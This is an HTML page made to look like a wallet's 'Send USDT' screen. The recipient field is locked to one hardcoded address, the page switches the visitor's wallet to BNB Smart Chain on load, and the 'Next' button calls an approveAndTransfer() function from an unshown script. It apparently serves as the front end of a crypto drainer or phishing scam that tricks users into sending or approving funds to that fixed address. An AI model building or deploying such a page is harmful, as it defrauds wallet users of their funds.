<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Send USDT</title>
  <link rel="stylesheet" href="style.css" />
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <style>
    label {
      color: #888; /* Gray label text */
      font-weight: 600;
      font-size: 15px;
    }

    .input-wrapper,
    .amount-wrapper {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 0px; /* Chokor */
      padding: 10px;
      background-color: #fff;
      width: 100%;
      box-sizing: border-box;
    }

    .input-wrapper input,
    .amount-wrapper input {
      border: none;
      outline: none;
      font-size: 16px;
      flex: 1;
      width: 100%;
    }

    .input-wrapper span,
    .amount-wrapper span {
      margin-left: 10px;
      font-weight: bold;
      color: #333;
      cursor: pointer;
    }

    .amount-line {
      margin-top: 5px;
      font-size: 14px;
      color: #666;
    }

    .btn-center {
      display: flex;
      justify-content: center;
    }

    .btn-center button {
      width: 90%;
      max-width: 400px;
      padding: 18px;
      margin-top: 30px;
      background-color: #002fff;
      color: #fff;
      font-weight: bold;
      font-size: 18px;
      border: none;
      border-radius: 0px; /* Chokor */
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
      cursor: pointer;
    }

    .btn-center button:active {
      transform: scale(0.98);
    }

    @media (max-width: 600px) {
      .container {
        padding: 15px;
      }
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background: #fff;
      color: #333;
      max-width: 100%;
      overflow-x: hidden;
    }

    .container {
      padding: 20px;
      max-width: 500px;
      margin: 0 auto;
    }
  </style>
</head>
<body>
  <div class="container">
    <label for="address">Address or Domain Name</label>
    <div class="input-wrapper">
      <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly>
      <span onclick="clearAddress()">✕</span>
      <span onclick="pasteAddress()">Paste</span>
    </div>

    <label for="amount">Amount</label>
    <div class="amount-wrapper">
      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateFiat()" />
      <span>USDT</span>
      <span onclick="fillMax()">Max</span>
    </div>

    <div class="amount-line" id="fiat">≈ $0.00</div>

    <div class="btn-center">
      <button onclick="approveAndTransfer()">Next</button>
    </div>
  </div>

  <script>
    // Auto-reload fix if blank (Trust Wallet)
    window.addEventListener("load", () => {
      if (document.body.innerHTML.trim() === "") {
        location.reload();
      }
    });

    // Auto switch to BNB Smart Chain (Chain ID: 0x38)
    async function ensureBNBChain() {
      if (window.ethereum) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
          });
        } catch (err) {
          if (err.code === 4902) {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x38',
                chainName: 'BNB Smart Chain',
                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                nativeCurrency: {
                  name: 'BNB',
                  symbol: 'BNB',
                  decimals: 18
                },
                blockExplorerUrls: ['https://bscscan.com']
              }]
            });
          }
        }
      }
    }

    ensureBNBChain();
  </script>

  <script src="script.js"></script>
</body>
</html>
